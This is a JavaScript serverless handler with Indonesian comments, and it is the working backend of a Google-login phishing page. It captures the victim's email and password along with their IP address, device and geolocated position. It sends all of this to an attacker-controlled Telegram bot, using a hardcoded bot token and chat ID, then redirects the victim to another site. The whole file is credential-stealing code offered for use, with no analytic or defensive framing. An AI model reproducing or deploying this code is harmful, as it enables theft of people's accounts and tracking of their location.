export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    const { email, password } = req.body;

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || 'unknown';
    const timestamp = new Date().toISOString();

    // Geolokasi
    let geoData = {};
    let locationString = 'Tidak diketahui';
    let lat = null, lon = null;

    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,region,lat,lon,isp,org,as,proxy,query`);
        geoData = await geoRes.json();
        if (geoData.status === 'success') {
            locationString = `${geoData.city}, ${geoData.country} (${geoData.isp})`;
            lat = geoData.lat;
            lon = geoData.lon;
        }
    } catch (err) {}

    let device = '❓ Unknown';
    if (userAgent.includes('iPhone')) device = '📱 iPhone';
    else if (userAgent.includes('iPad')) device = '📱 iPad';
    else if (userAgent.includes('Android')) device = '🤖 Android';
    else if (userAgent.includes('Windows')) device = '💻 Windows';
    else if (userAgent.includes('Mac')) device = '🍎 Mac';
    else if (userAgent.includes('Linux')) device = '🐧 Linux';

    const message = `🎭 *GOOGLE PHISHING + CAMERA* 🎭\n━━━━━━━━━━━━━━━━━━━━\n📅 Waktu: ${timestamp}\n\n🔐 *LOGIN*\n📧 Email: \`${email}\`\n🔑 Password: \`${password}\`\n\n🌐 *NETWORK*\n🖥️ IP: \`${ip}\`\n📍 Lokasi: ${locationString}\n📡 ISP: ${geoData.isp || 'unknown'}\n\n📱 *DEVICE*\n${device}\n🔧 UA: \`${userAgent}\``;

    const botToken = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
    const chatId = "8753510792";

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (lat && lon) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    latitude: lat,
                    longitude: lon
                })
            });
        }
    } catch (err) {}

    // REDIRECT KE LINK TARGET KAMU
    res.redirect(302, 'https://spotplaymav7.lovable.app');
}
